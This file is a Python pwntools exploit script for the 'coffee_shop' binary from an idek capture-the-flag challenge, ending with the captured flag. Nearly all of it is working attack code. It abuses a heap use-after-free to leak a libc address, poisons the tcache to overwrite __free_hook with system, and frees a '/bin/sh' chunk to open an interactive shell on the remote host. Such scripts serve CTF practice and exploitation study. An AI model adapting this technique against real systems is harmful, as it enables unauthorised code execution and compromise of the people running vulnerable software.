#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host coffee-shop.chal.idek.team --port 1337 coffee_shop
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('coffee_shop')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'coffee-shop.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b *file_complaint+134
#b *revert_complaint+51
b edit_complaint
#b view_complaint
#b get_manager
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def file_complaint(size, content):
    io.sendline('4')
    io.sendline(str(size))
    io.sendline(content)

def free_complaint(idx):
    io.sendline('5')
    io.sendline(str(idx))

def edit_complaint(idx, content):
    io.sendline('6')
    io.sendline(str(idx))
    io.sendline(content)

def view_complaint(idx):
    io.sendline('7')
    io.sendline(str(idx))


file_complaint(0x60, b'/bin/sh')  # 0
file_complaint(0x60, b'/bin/sh')  # 1
file_complaint(0x4ff, b'/bin/sh') # 2
file_complaint(0x60, b'/bin/sh')  # 3
file_complaint(0x60, b'/bin/sh')  # 4

free_complaint(0) 
free_complaint(1)

# leak libc from unsorted bin
io.clean()
free_complaint(2)
io.clean()
view_complaint(2)
io.recvuntil(b'ID: ')

leak = int.from_bytes(io.recvline().rstrip(), 'little')
print("LEAK:    ", hex(leak))
libc_base = leak - 0x1c6be0
libc_base = leak - 0x1ebbe0
print("BASE:    ", hex(libc_base))
system = libc_base + 0x055410
free_hook = libc_base + 0x1eeb28
print("SYSTEM:    ", hex(system))
print("FREEHOOK:    ", hex(free_hook))

edit_complaint(1, p64(free_hook))
file_complaint(0x60, b'lmao')
file_complaint(0x60, p64(system))

free_complaint(3)

io.interactive()
#idek{4Nd_7h4t's_h0W_Y0u_3xpl01t_4_k3rn3l_u4f}
